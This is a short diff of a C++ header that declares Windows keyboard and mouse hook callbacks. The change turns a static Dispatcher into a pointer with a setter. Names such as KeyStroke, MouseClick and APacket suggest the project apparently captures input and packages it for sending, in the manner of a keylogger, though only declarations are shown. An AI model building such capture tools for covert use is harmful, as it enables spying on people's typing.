@@ -3,9 +3,10 @@
 
 # include <iostream>
 # include <string>
-# include <Windows.h>
 
 # include "Dispatcher.hpp"
+# include <Windows.h>
+
 # include "APacket.hpp"
 # include "KeyStroke.hpp"
 # include "MouseClick.hpp"
@@ -19,13 +20,14 @@ public:
 	static LRESULT CALLBACK handleKey(int code, WPARAM wParam, LPARAM lParam);
 	static LRESULT CALLBACK handleMouse(int code, WPARAM wParam, LPARAM lParam);
 
+	static void setDispatcher(Dispatcher *disp);
 private:
 
 	static HINSTANCE	_hInst;
 	static HHOOK		_hook;
 	static bool			_capsLock;
 	static bool			_maj;
-	static Dispatcher	_disp;
+	static Dispatcher	*_disp;
 };
 
 #endif
